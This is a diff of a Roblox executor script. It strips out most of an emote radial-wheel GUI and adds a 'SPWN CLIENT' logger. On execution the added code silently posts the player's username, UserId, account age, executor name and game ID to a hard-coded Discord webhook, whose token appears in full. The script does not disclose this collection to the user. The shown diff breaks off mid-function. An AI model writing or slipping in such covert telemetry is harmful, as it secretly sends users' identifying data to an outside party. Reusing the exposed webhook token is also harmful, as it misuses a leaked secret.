@@ -1,1253 +1,517 @@
---[[
-    Script: 7yd7 | Roda Radial de Emotes - VISUAL FINAL EXATO + MELHORIAS
-    - Design preto e branco (Arcade) com divisórias brancas
-    - Sistema Radial funcional com reset ao trocar de página
-    - Modal Salvar movido para a direita
-    - Categorias e Favoritos (Estrela) salvos em JSON persistente
-    - Favoritos aparecem no topo da lista
-    - Botão Externo: Reduzido em 15%, no topo central, esconde ao abrir e volta ao clicar fora.
-    - Múltiplos Emotes simultâneos (Sobreposição permitida)
-    - Ordem de Categoria preservada por fatia (página 1, 2, etc.)
-    - Sistema de Notificação (Toast) ao salvar emote.
-    - Ícone do sol brilha na categoria selecionada no modal.
-]]
-
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local AvatarEditorService = game:GetService("AvatarEditorService")
 local HttpService = game:GetService("HttpService")
-local MarketplaceService = game:GetService("MarketplaceService")
-local CoreGui = game:GetService("CoreGui")
-local TweenService = game:GetService("TweenService")
-
+local Players = game:GetService("Players")
+local MarketPlaceService = game:GetService("MarketplaceService")
 local LocalPlayer = Players.LocalPlayer
-local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
-local lastPosition = character.PrimaryPart and character.PrimaryPart.Position or Vector3.new()
 
-LocalPlayer.CharacterAdded:Connect(function(newCharacter)
-    character = newCharacter
-    humanoid = newCharacter:WaitForChild("Humanoid")
-    lastPosition = character.PrimaryPart and character.PrimaryPart.Position or Vector3.new()
+local WebhookURL = "https://discord.com/api/webhooks/1539277119895380008/alBU5YhZjmV99l6hgAjqn1x4XUGi2LktevgpCtmsedldyGuB_KVB43LXxYsfV9xfuMHb"
+
+local function GetExecutor()
+    return (identifyexecutor and identifyexecutor()) 
+        or (getexecutorname and getexecutorname()) 
+        or "Desconhecido"
+end
+
+local placeName = "Desconhecido"
+pcall(function()
+    placeName = MarketPlaceService:GetProductInfo(game.PlaceId).Name
 end)
 
-local Settings = { Speed = 1, StopOnMove = true }
+local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
 
---// ASSETS
-local ID_CARTUCHO_SEMBORDA = "rbxassetid://96618641654782"
-local ID_BTN_DOCUMENTO = "rbxassetid://76204370315940"
-local ID_BTN_EXTERNO = "rbxassetid://115103675836200"
-local ID_ICONE_SOL = "rbxassetid://77667780640343"
-local ID_SIMBOLO_MAIS = "rbxassetid://85682941433471"
-local ID_SIMBOLO_LIXEIRA = "rbxassetid://78774633521849"
-local ID_CARTUCHO_SALVAR = "rbxassetid://103168629250780"
-local ID_FECHAR_X = "rbxassetid://78774633521849"
-local ID_LAPIS = "rbxassetid://105157650009654"
-local ID_SETA_ESQUERDA = "rbxassetid://112363067871003"
-local ID_SETA_DIREITA = "rbxassetid://138794689086376"
-local ID_ESTRELA = "rbxassetid://77340475678237" 
+local function EnviarLogDiscord()
+    if not httpRequest or WebhookURL == "" then return end
 
-local MARGIN = 14
+    local payloadData = {
+        ["username"] = "SPWN CLIENT",
+        ["embeds"] = {
+            {
+                ["title"] = "SPWN CLIENT Executed",
+                ["description"] = "SPWN CLIENT Menu has been executed",
+                ["color"] = 16777215,
+                ["fields"] = {
+                    { ["name"] = "Player", ["value"] = "```" .. tostring(LocalPlayer.Name) .. "```", ["inline"] = false },
+                    { ["name"] = "User ID", ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```", ["inline"] = false },
+                    { ["name"] = "Account Age", ["value"] = "```" .. tostring(LocalPlayer.AccountAge) .. " days```", ["inline"] = false },
+                    { ["name"] = "Executor", ["value"] = "```" .. tostring(GetExecutor()) .. "```", ["inline"] = false },
+                    { ["name"] = "Game", ["value"] = "```" .. tostring(placeName) .. "```", ["inline"] = false },
+                    { ["name"] = "Place ID", ["value"] = "```" .. tostring(game.PlaceId) .. "```", ["inline"] = false }
+                },
+                ["footer"] = {
+                    ["text"] = "SPWN Logs || System by: CHROLLO"
+                }
+            }
+        }
+    }
 
---// PERSISTÊNCIA
-local FOLDER = "7yd7"
-local EMOTE_CACHE_FILE = FOLDER .. "/EmoteListCache.json"
-local CATEGORIES_FILE = FOLDER .. "/Categories.json"
-local STARRED_FILE = FOLDER .. "/Starred.json"
-local GITHUB_URL = "https://raw.githubusercontent.com/7yd7/sniper-Emote/refs/heads/test/EmoteSniper.json"
-local DEFAULT_TOTAL_PAGES = 7415
-
-local function ensureFolder()
-    if isfolder and not isfolder(FOLDER) then pcall(function() makefolder(FOLDER) end) end
-end
-
-local allEmotes, filteredEmotes, emoteIndexById = {}, {}, {}
-local emoteData = { categories = {} }
-local starredEmotes = {}
-
-local function LoadJSON(fileName, fallback)
-    ensureFolder()
-    if isfile and isfile(fileName) then
-        local ok, decoded = pcall(function() return HttpService:JSONDecode(readfile(fileName)) end)
-        if ok and type(decoded) == "table" then return decoded end
-    end
-    return fallback
-end
-
-local function SaveJSON(fileName, data)
-    ensureFolder()
-    if writefile then pcall(function() writefile(fileName, HttpService:JSONEncode(data)) end) end
-end
-
-local cached = LoadJSON(EMOTE_CACHE_FILE, nil)
-if cached and #cached > 0 then
-    allEmotes = cached
-else
-    local g = pcall(function() return HttpService:JSONDecode(game:HttpGet(GITHUB_URL)).data end)
-    if g and type(g) == "table" then
-        for _, item in ipairs(g) do
-            local id = tonumber(item.id)
-            if id and id > 0 then table.insert(allEmotes, {id = id, name = item.name or ("Emote_" .. id)}) end
-        end
-    end
-    if #allEmotes > 0 then SaveJSON(EMOTE_CACHE_FILE, allEmotes) end
-end
-
-local loadedCategories = LoadJSON(CATEGORIES_FILE, { categories = {} })
-if loadedCategories and loadedCategories.categories then emoteData.categories = loadedCategories.categories end
-
-local loadedStarred = LoadJSON(STARRED_FILE, {})
-if loadedStarred and type(loadedStarred) == "table" then starredEmotes = loadedStarred end
-
-local function RebuildIndex()
-    emoteIndexById = {}
-    for _, e in ipairs(allEmotes) do emoteIndexById[tostring(e.id)] = e end
-end
-
-local function FetchFromAPI(keyword)
-    local out = {}
-    local ok, pages = pcall(function()
-        local params = CatalogSearchParams.new()
-        params.SearchKeyword = keyword or ""
-        params.AssetTypes = { Enum.AvatarAssetType.EmoteAnimation }
-        params.SortType = Enum.CatalogSortType.RecentlyCreated
-        params.Limit = 120
-        return AvatarEditorService:SearchCatalog(params)
-    end)
-    if ok and pages then
-        local s, list = pcall(function() return pages:GetCurrentPage() end)
-        if s and list then
-            for _, v in ipairs(list) do
-                local id = tonumber(v.Id or v.AssetId)
-                if id then table.insert(out, {id = id, name = v.Name or ("Emote_" .. id)}) end
-            end
-        end
-    end
-    return out
-end
-
-local function smartSearchMatch(name, term)
-    if not term or term == "" then return true end
-    name = tostring(name):lower()
-    term = tostring(term):lower()
-    for word in term:gmatch("%S+") do
-        if not name:find(word, 1, true) then return false end
-    end
-    return true
-end
-
--- Aplica busca e ordena os favoritos primeiro
-local function applySearchLocal(term)
-    term = tostring(term or ""):lower()
-    local out = {}
-    if term == "" then
-        out = allEmotes
-    else
-        local isId = term:match("^%d+$")
-        if isId then
-            local item = emoteIndexById[term]
-            if item then out = {item} else out = {} end
-        else
-            for _, e in ipairs(allEmotes) do
-                if smartSearchMatch(e.name, term) then table.insert(out, e) end
-            end
-        end
-    end
-
-    local starredSet = {}
-    for i, id in ipairs(starredEmotes) do starredSet[tostring(id)] = i end
-    
-    local starredList, normalList = {}, {}
-    for _, e in ipairs(out) do
-        if starredSet[tostring(e.id)] then table.insert(starredList, e) else table.insert(normalList, e) end
-    end
-    
-    table.sort(starredList, function(a, b)
-        return (starredSet[tostring(a.id)] or 9999) < (starredSet[tostring(b.id)] or 9999)
+    local success, payload = pcall(function()
+        return HttpService:JSONEncode(payloadData)
     end)
 
-    filteredEmotes = {}
-    for _, e in ipairs(starredList) do table.insert(filteredEmotes, e) end
-    for _, e in ipairs(normalList) do table.insert(filteredEmotes, e) end
-    
-    return #filteredEmotes
-end
+    if not success then return end
 
-RebuildIndex()
-
---// STATE
-local ActiveTracks = {} 
-local currentCategory = "All"
-local currentPage = 1
-local totalPages = DEFAULT_TOTAL_PAGES
-local currentKeyword = ""
-local selectedEmoteItem = nil
-local catalogItems = {}
-local slotButtons, slotImages, slotHighlights, slotTexts, slotStars = {}, {}, {}, {}, {}
-local searchToken = 0
-
-local updateWheelSlots, loadPage, buildCategoriesMenu, openSaveModal
-
---// TRACK (Múltiplos Emotes)
-local function LoadTrack(id)
-    local animId
-    local ok, result = pcall(function() return game:GetObjects("rbxassetid://" .. tostring(id)) end)
-    if ok and result and #result > 0 and result[1]:IsA("Animation") then
-        animId = result[1].AnimationId
-    else
-        animId = "rbxassetid://" .. tostring(id)
-    end
-    
-    local newAnim = Instance.new("Animation")
-    newAnim.AnimationId = animId
-    local newTrack = humanoid:LoadAnimation(newAnim)
-    
-    newTrack.Priority = Enum.AnimationPriority.Action4
-    newTrack.Looped = true
-    
-    newTrack:Play(0.1, 1, Settings.Speed)
-    newTrack:AdjustWeight(1, 0)
-    
-    table.insert(ActiveTracks, newTrack)
-end
-
-RunService.RenderStepped:Connect(function()
-    if character and character:FindFirstChild("HumanoidRootPart") then
-        local root = character.HumanoidRootPart
-        if Settings.StopOnMove and #ActiveTracks > 0 then
-            local moved = (root.Position - lastPosition).Magnitude > 0.1
-            local jumped = humanoid and humanoid:GetState() == Enum.HumanoidStateType.Jumping
-            if moved or jumped then
-                for _, track in ipairs(ActiveTracks) do
-                    if track.IsPlaying then track:Stop(0.1) end
-                end
-                ActiveTracks = {}
-            end
-        end
-        lastPosition = root.Position
-    end
-end)
-
---// PARENT GUI
-local success, parentTarget = pcall(function()
-    if gethui then return gethui()
-    elseif syn and syn.protect_gui then
-        local gui = Instance.new("ScreenGui"); syn.protect_gui(gui); return gui
-    else return CoreGui end
-end)
-if not success or not parentTarget then parentTarget = Players.LocalPlayer:WaitForChild("PlayerGui") end
-
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "EmoteRadialGui_Hybrid"
-screenGui.ResetOnSpawn = false
-screenGui.IgnoreGuiInset = true
-screenGui.Parent = parentTarget
-
---// BOTÃO EXTERNO
-local toggleButton = Instance.new("ImageButton")
-toggleButton.Size = UDim2.new(0, 45, 0, 45) 
-toggleButton.AnchorPoint = Vector2.new(0.5, 0.5)
-toggleButton.Position = UDim2.new(0.5, 0, 0, 40) 
-toggleButton.BackgroundTransparency = 1
-toggleButton.Image = ID_BTN_EXTERNO
-toggleButton.Parent = screenGui
-
-local dragging, dragInput, dragStart, startPos
-toggleButton.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true; dragStart = input.Position; startPos = toggleButton.Position
-        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
-    end
-end)
-toggleButton.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
-end)
-UserInputService.InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
-        local delta = input.Position - dragStart
-        toggleButton.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
-end)
-
-local mainContainer = Instance.new("Frame")
-mainContainer.Size = UDim2.new(1, 0, 1, 0)
-mainContainer.BackgroundTransparency = 1
-mainContainer.Visible = false
-mainContainer.Parent = screenGui
-
-toggleButton.MouseButton1Click:Connect(function()
-    mainContainer.Visible = true
-    toggleButton.Visible = false
-end)
-
---// RODA RADIAL
-local WHEEL_SIZE = 276
-local wheelFrame = Instance.new("Frame")
-wheelFrame.Size = UDim2.fromOffset(WHEEL_SIZE, WHEEL_SIZE)
-wheelFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-wheelFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
-wheelFrame.BackgroundTransparency = 1
-wheelFrame.Parent = mainContainer
-
---// BARRA SUPERIOR
-local topBar = Instance.new("Frame")
-topBar.Size = UDim2.fromOffset(372, 38)
-topBar.AnchorPoint = Vector2.new(0.5, 1)
-topBar.Position = UDim2.new(0.5, 0, 0, -MARGIN)
-topBar.BackgroundTransparency = 1
-topBar.Parent = wheelFrame
-
-local docButton = Instance.new("ImageButton")
-docButton.Size = UDim2.fromOffset(38, 38)
-docButton.AnchorPoint = Vector2.new(0, 0.5)
-docButton.Position = UDim2.new(0, 0, 0.5, 0)
-docButton.BackgroundTransparency = 1
-docButton.Image = ID_BTN_DOCUMENTO
-docButton.Parent = topBar
-
-local searchContainer = Instance.new("Frame")
-searchContainer.Size = UDim2.fromOffset(276, 36)
-searchContainer.AnchorPoint = Vector2.new(0, 0.5)
-searchContainer.Position = UDim2.new(0, 48, 0.5, 0)
-searchContainer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-searchContainer.Parent = topBar
-Instance.new("UICorner", searchContainer).CornerRadius = UDim.new(0, 18)
-local searchStroke = Instance.new("UIStroke", searchContainer)
-searchStroke.Color = Color3.fromRGB(255, 255, 255)
-searchStroke.Thickness = 1.8
-
-local searchBox = Instance.new("TextBox")
-searchBox.Size = UDim2.new(1, -19, 1, 0)
-searchBox.Position = UDim2.new(0, 10, 0, 0)
-searchBox.BackgroundTransparency = 1
-searchBox.PlaceholderText = "Search/Emotes"
-searchBox.Text = ""
-searchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-searchBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
-searchBox.TextSize = 13
-searchBox.Font = Enum.Font.Arcade
-searchBox.ClearTextOnFocus = false
-searchBox.TextXAlignment = Enum.TextXAlignment.Center
-searchBox.Parent = searchContainer
-
-local cartridgeButton = Instance.new("ImageButton")
-cartridgeButton.Size = UDim2.fromOffset(38, 38)
-cartridgeButton.AnchorPoint = Vector2.new(1, 0.5)
-cartridgeButton.Position = UDim2.new(1, 0, 0.5, 0)
-cartridgeButton.BackgroundTransparency = 1
-cartridgeButton.Image = ID_CARTUCHO_SEMBORDA
-cartridgeButton.Visible = false
-cartridgeButton.Parent = topBar
-cartridgeButton.MouseButton1Click:Connect(function() if selectedEmoteItem then openSaveModal() end end)
-
---// BARRA INFERIOR
-local navContainer = Instance.new("Frame")
-navContainer.Size = UDim2.fromOffset(240, 34)
-navContainer.AnchorPoint = Vector2.new(0.5, 0)
-navContainer.Position = UDim2.new(0.5, 0, 1, MARGIN)
-navContainer.BackgroundTransparency = 1
-navContainer.Parent = wheelFrame
-
-local navLayout = Instance.new("UIListLayout")
-navLayout.FillDirection = Enum.FillDirection.Horizontal
-navLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-navLayout.VerticalAlignment = Enum.VerticalAlignment.Center
-navLayout.SortOrder = Enum.SortOrder.LayoutOrder
-navLayout.Padding = UDim.new(0, 7)
-navLayout.Parent = navContainer
-
-local prevButton = Instance.new("ImageButton")
-prevButton.Size = UDim2.fromOffset(28, 28)
-prevButton.BackgroundTransparency = 1
-prevButton.Image = ID_SETA_ESQUERDA
-prevButton.LayoutOrder = 1
-prevButton.Parent = navContainer
-
-local pageTextBox = Instance.new("TextBox")
-pageTextBox.Size = UDim2.fromOffset(38, 26)
-pageTextBox.BackgroundTransparency = 1
-pageTextBox.Text = tostring(currentPage)
-pageTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-pageTextBox.TextSize = 14
-pageTextBox.Font = Enum.Font.Arcade
-pageTextBox.ClearTextOnFocus = false
-pageTextBox.TextXAlignment = Enum.TextXAlignment.Center
-pageTextBox.LayoutOrder = 2
-pageTextBox.Parent = navContainer
-
-local dividerLine = Instance.new("Frame")
-dividerLine.Size = UDim2.new(1, -108, 0, 2)
-dividerLine.BackgroundTransparency = 1
-dividerLine.LayoutOrder = 3
-dividerLine.Parent = navContainer
-
-for i = 1, 12 do
-    local dash = Instance.new("Frame")
-    dash.Size = UDim2.new(0, 3, 1, 0)
-    dash.Position = UDim2.new((i-1)/12, 0, 0, 0)
-    dash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    dash.BorderSizePixel = 0
-    dash.Parent = dividerLine
-end
-
-local pageInfoLabel = Instance.new("TextLabel")
-pageInfoLabel.Size = UDim2.fromOffset(48, 26)
-pageInfoLabel.BackgroundTransparency = 1
-pageInfoLabel.Text = tostring(totalPages)
-pageInfoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-pageInfoLabel.TextSize = 14
-pageInfoLabel.TextXAlignment = Enum.TextXAlignment.Center
-pageInfoLabel.Font = Enum.Font.Arcade
-pageInfoLabel.LayoutOrder = 4
-pageInfoLabel.Parent = navContainer
-
-local nextButton = Instance.new("ImageButton")
-nextButton.Size = UDim2.fromOffset(28, 28)
-nextButton.BackgroundTransparency = 1
-nextButton.Image = ID_SETA_DIREITA
-nextButton.LayoutOrder = 5
-nextButton.Parent = navContainer
-
---// PAINEL LATERAL
-local sidePanel = Instance.new("Frame")
-sidePanel.Size = UDim2.fromOffset(180, 276)
-sidePanel.AnchorPoint = Vector2.new(1, 0.5)
-sidePanel.Position = UDim2.new(0, -MARGIN, 0.5, 0)
-sidePanel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-sidePanel.Visible = false
-sidePanel.Parent = wheelFrame
-Instance.new("UICorner", sidePanel).CornerRadius = UDim.new(0, 10)
-local sideStroke = Instance.new("UIStroke", sidePanel)
-sideStroke.Color = Color3.fromRGB(255, 255, 255)
-sideStroke.Thickness = 2
-sidePanel.ClipsDescendants = true
-
-local sideHeader = Instance.new("Frame")
-sideHeader.Size = UDim2.new(1, 0, 0, 42)
-sideHeader.BackgroundTransparency = 1
-sideHeader.Parent = sidePanel
-
-local sunIcon = Instance.new("ImageLabel")
-sunIcon.Size = UDim2.fromOffset(22, 22)
-sunIcon.AnchorPoint = Vector2.new(0, 0.5)
-sunIcon.Position = UDim2.new(0, 14, 0.5, 0)
-sunIcon.BackgroundTransparency = 1
-sunIcon.Image = ID_ICONE_SOL
-sunIcon.Parent = sideHeader
-
-local sideTitle = Instance.new("TextLabel")
-sideTitle.Size = UDim2.new(1, -48, 1, 0)
-sideTitle.Position = UDim2.new(0, 42, 0, 0)
-sideTitle.BackgroundTransparency = 1
-sideTitle.Text = "DATA BASE EMOTE V1"
-sideTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-sideTitle.TextSize = 13
-sideTitle.Font = Enum.Font.Arcade
-sideTitle.TextXAlignment = Enum.TextXAlignment.Left
-sideTitle.Parent = sideHeader
-
-local sideScrolling = Instance.new("ScrollingFrame")
-sideScrolling.Size = UDim2.new(1, -10, 1, -120)
-sideScrolling.Position = UDim2.new(0, 5, 0, 46)
-sideScrolling.BackgroundTransparency = 1
-sideScrolling.ScrollBarThickness = 2
-sideScrolling.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-sideScrolling.CanvasSize = UDim2.new(0, 0, 0, 0)
-sideScrolling.AutomaticCanvasSize = Enum.AutomaticSize.Y
-sideScrolling.Parent = sidePanel
-
-local sideLayout = Instance.new("UIListLayout")
-sideLayout.SortOrder = Enum.SortOrder.LayoutOrder
-sideLayout.Padding = UDim.new(0, 5)
-sideLayout.Parent = sideScrolling
-
-local sidePadding = Instance.new("UIPadding")
-sidePadding.PaddingTop = UDim.new(0, 4)
-sidePadding.PaddingLeft = UDim.new(0, 5)
-sidePadding.PaddingRight = UDim.new(0, 7)
-sidePadding.Parent = sideScrolling
-
-local sideFooter = Instance.new("Frame")
-sideFooter.Size = UDim2.new(1, -10, 0, 74)
-sideFooter.Position = UDim2.new(0, 5, 1, -77)
-sideFooter.BackgroundTransparency = 1
-sideFooter.Parent = sidePanel
-
-local function createFooterButton(text, iconId, order, extraSymbol)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(1, 0, 0, 34)
-    btn.Position = UDim2.new(0, 0, 0, (order - 1) * 38)
-    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    btn.AutoButtonColor = false; btn.Text = ""; btn.Parent = sideFooter
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
-    local stroke = Instance.new("UIStroke", btn)
-    stroke.Color = Color3.fromRGB(255, 255, 255); stroke.Thickness = 1; stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-
-    local icon = Instance.new("ImageLabel")
-    icon.Size = UDim2.fromOffset(17, 17); icon.Position = UDim2.new(0, 10, 0.5, -8)
-    icon.BackgroundTransparency = 1; icon.Image = iconId; icon.Parent = btn
-
-    local txt = Instance.new("TextLabel")
-    txt.Size = UDim2.new(1, -36, 1, 0); txt.Position = UDim2.new(0, 31, 0, 0)
-    txt.BackgroundTransparency = 1; txt.Text = text; txt.TextColor3 = Color3.fromRGB(255, 255, 255)
-    txt.TextSize = 11; txt.Font = Enum.Font.Arcade; txt.TextXAlignment = Enum.TextXAlignment.Left; txt.Parent = btn
-
-    if extraSymbol then
-        local symbol = Instance.new("TextLabel")
-        symbol.Size = UDim2.new(0, 14, 1, 0); symbol.Position = UDim2.new(1, -19, 0, 0)
-        symbol.BackgroundTransparency = 1; symbol.Text = extraSymbol; symbol.TextColor3 = Color3.fromRGB(255, 255, 255)
-        symbol.TextSize = 12; symbol.Font = Enum.Font.Arcade; symbol.Parent = btn
-    end
-    return btn
-end
-
-local createCatGlobalBtn = createFooterButton("Criar Categoria", ID_SIMBOLO_MAIS, 1, ">")
-local removeCatGlobalBtn = createFooterButton("Remover Categoria", ID_SIMBOLO_LIXEIRA, 2)
-
-docButton.MouseButton1Click:Connect(function() sidePanel.Visible = not sidePanel.Visible end)
-
-local function promptRenameCategory(oldName)
-    local targetBtn = nil
-    for _, child in ipairs(sideScrolling:GetChildren()) do
-        if child:IsA("TextButton") and child:GetAttribute("CategoryName") == oldName then targetBtn = child; break end
-    end
-    if not targetBtn then return end
-    local titleLabel = targetBtn:FindFirstChild("CatTitle")
-    if not titleLabel then return end
-
-    local textBox = Instance.new("TextBox")
-    textBox.Size = titleLabel.Size; textBox.Position = titleLabel.Position
-    textBox.BackgroundTransparency = 1; textBox.Text = oldName
-    textBox.TextColor3 = titleLabel.TextColor3; textBox.TextSize = titleLabel.TextSize
-    textBox.Font = titleLabel.Font; textBox.TextXAlignment = titleLabel.TextXAlignment
-    textBox.ClearTextOnFocus = false; textBox.Parent = targetBtn
-    titleLabel.Visible = false; textBox:CaptureFocus()
-
-    local finished = false
-    local function finishRename(commit)
-        if finished then return end; finished = true
-        if commit and textBox.Text ~= "" then
-            local newName = textBox.Text
-            for _, cat in ipairs(emoteData.categories) do if cat.name == oldName then cat.name = newName break end end
-            if currentCategory == oldName then currentCategory = newName end
-            SaveJSON(CATEGORIES_FILE, emoteData)
-        end
-        textBox:Destroy(); buildCategoriesMenu()
-    end
-    textBox.FocusLost:Connect(function(enterPressed) finishRename(enterPressed) end)
-end
-
-createCatGlobalBtn.MouseButton1Click:Connect(function()
-    table.insert(emoteData.categories, { name = "Nova Cat " .. (#emoteData.categories + 1), emotes = {} })
-    SaveJSON(CATEGORIES_FILE, emoteData)
-    buildCategoriesMenu()
-end)
-
-removeCatGlobalBtn.MouseButton1Click:Connect(function()
-    if currentCategory == "All" then return end
-    for i, cat in ipairs(emoteData.categories) do
-        if cat.name == currentCategory then table.remove(emoteData.categories, i); currentCategory = "All"; break end
-    end
-    SaveJSON(CATEGORIES_FILE, emoteData)
-    buildCategoriesMenu(); loadPage(1)
-end)
-
---// SISTEMA DE NOTIFICAÇÃO (TOAST)
-local function ShowToast(catName)
-    local existing = screenGui:FindFirstChild("ToastNotification")
-    if existing then existing:Destroy() end
-
-    local toast = Instance.new("Frame")
-    toast.Name = "ToastNotification"
-    toast.Size = UDim2.fromOffset(280, 50)
-    toast.AnchorPoint = Vector2.new(1, 1)
-    toast.Position = UDim2.new(1, -MARGIN, 1, -MARGIN)
-    toast.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    toast.BorderSizePixel = 0
-    toast.ZIndex = 99
-    toast.Parent = screenGui
-    Instance.new("UICorner", toast).CornerRadius = UDim.new(0, 8)
-    
-    local stroke = Instance.new("UIStroke", toast)
-    stroke.Color = Color3.fromRGB(255, 255, 255)
-    stroke.Thickness = 2
-
-    local txt = Instance.new("TextLabel")
-    txt.Size = UDim2.new(1, -20, 1, 0)
-    txt.Position = UDim2.new(0, 10, 0, 0)
-    txt.BackgroundTransparency = 1
-    txt.Text = "Emote Salvo com Sucesso Na\nCategoria ( " .. catName .. " )"
-    txt.TextColor3 = Color3.fromRGB(255, 255, 255)
-    txt.TextSize = 14
-    txt.Font = Enum.Font.Arcade
-    txt.TextWrapped = true
-    txt.TextXAlignment = Enum.TextXAlignment.Left
-    txt.ZIndex = 100
-    txt.Parent = toast
-
-    -- Animação de entrada
-    toast.Position = UDim2.new(1, -MARGIN, 1, MARGIN + 50)
-    TweenService:Create(toast, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-        Position = UDim2.new(1, -MARGIN, 1, -MARGIN)
-    }):Play()
-
-    -- Temporizador de 2 segundos
-    task.delay(2, function()
-        if toast and toast.Parent then
-            local fadeOut = TweenService:Create(toast, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
-                Position = UDim2.new(1, -MARGIN, 1, MARGIN + 50)
+    task.spawn(function()
+        pcall(function()
+            httpRequest({
+                Url = WebhookURL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = payload
             })
-            fadeOut:Play()
-            fadeOut.Completed:Connect(function()
-                toast:Destroy()
-            end)
-        end
-    end)
-end
-
---// MODAL SALVAR
-local saveModal = Instance.new("Frame")
-saveModal.Size = UDim2.fromOffset(336, 240)
-saveModal.AnchorPoint = Vector2.new(0.5, 0.5)
-saveModal.Position = UDim2.new(0.5, 160, 0.5, 0) 
-saveModal.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-saveModal.Visible = false; saveModal.ZIndex = 10; saveModal.Parent = mainContainer
-Instance.new("UICorner", saveModal).CornerRadius = UDim.new(0, 10)
-local mStroke = Instance.new("UIStroke", saveModal)
-mStroke.Color = Color3.fromRGB(255, 255, 255); mStroke.Thickness = 2; mStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-
-local modalHeader = Instance.new("Frame")
-modalHeader.Size = UDim2.new(1, 0, 0, 46); modalHeader.BackgroundTransparency = 1; modalHeader.ZIndex = 11; modalHeader.Parent = saveModal
-
-local modalTitleIcon = Instance.new("ImageLabel")
-modalTitleIcon.Size = UDim2.fromOffset(26, 26); modalTitleIcon.Position = UDim2.new(0, 14, 0.5, -13)
-modalTitleIcon.BackgroundTransparency = 1; modalTitleIcon.Image = ID_CARTUCHO_SALVAR; modalTitleIcon.ZIndex = 11; modalTitleIcon.Parent = modalHeader
-
-local modalTitle = Instance.new("TextLabel")
-modalTitle.Size = UDim2.new(1, -108, 1, 0); modalTitle.Position = UDim2.new(0, 48, 0, 0)
-modalTitle.BackgroundTransparency = 1; modalTitle.Text = "Salvar em Categoria"; modalTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-modalTitle.TextSize = 18; modalTitle.Font = Enum.Font.Arcade; modalTitle.TextXAlignment = Enum.TextXAlignment.Left
-modalTitle.ZIndex = 11; modalTitle.Parent = modalHeader
-
-local closeModalBtn = Instance.new("ImageButton")
-closeModalBtn.Size = UDim2.fromOffset(26, 26); closeModalBtn.AnchorPoint = Vector2.new(1, 0.5); closeModalBtn.Position = UDim2.new(1, -12, 0.5, 0)
-closeModalBtn.BackgroundTransparency = 1; closeModalBtn.Image = ID_FECHAR_X; closeModalBtn.ZIndex = 11; closeModalBtn.Parent = modalHeader
-closeModalBtn.MouseButton1Click:Connect(function() saveModal.Visible = false end)
-
-local modalDivider = Instance.new("Frame")
-modalDivider.Size = UDim2.new(1, -29, 0, 1); modalDivider.Position = UDim2.new(0, 14, 0, 46)
-modalDivider.BackgroundColor3 = Color3.fromRGB(255, 255, 255); modalDivider.BorderSizePixel = 0; modalDivider.ZIndex = 11; modalDivider.Parent = saveModal
-
-local modalSubtitle = Instance.new("TextLabel")
-modalSubtitle.Size = UDim2.new(1, -29, 0, 24); modalSubtitle.Position = UDim2.new(0, 14, 0, 50)
-modalSubtitle.BackgroundTransparency = 1; modalSubtitle.Text = "Escolha uma categoria para salvar o emote:"
-modalSubtitle.TextColor3 = Color3.fromRGB(255, 255, 255); modalSubtitle.TextSize = 12; modalSubtitle.Font = Enum.Font.Arcade
-modalSubtitle.TextXAlignment = Enum.TextXAlignment.Left; modalSubtitle.ZIndex = 11; modalSubtitle.Parent = saveModal
-
-local modalScrolling = Instance.new("ScrollingFrame")
-modalScrolling.Size = UDim2.new(1, -29, 1, -146); modalScrolling.Position = UDim2.new(0, 14, 0, 79)
-modalScrolling.BackgroundTransparency = 1; modalScrolling.ScrollBarThickness = 3
-modalScrolling.AutomaticCanvasSize = Enum.AutomaticSize.Y; modalScrolling.CanvasSize = UDim2.new(0, 0, 0, 0)
-modalScrolling.ClipsDescendants = true; modalScrolling.ZIndex = 11; modalScrolling.Parent = saveModal
-
-local mListLayout = Instance.new("UIListLayout")
-mListLayout.Padding = UDim.new(0, 5); mListLayout.SortOrder = Enum.SortOrder.LayoutOrder; mListLayout.Parent = modalScrolling
-local mPadding = Instance.new("UIPadding")
-mPadding.PaddingTop = UDim.new(0, 3); mPadding.PaddingBottom = UDim.new(0, 5); mPadding.PaddingLeft = UDim.new(0, 3); mPadding.PaddingRight = UDim.new(0, 7); mPadding.Parent = modalScrolling
-
-local targetCategoryToSave = nil
-
-openSaveModal = function()
-    for _, child in ipairs(modalScrolling:GetChildren()) do if child:IsA("TextButton") then child:Destroy() end end
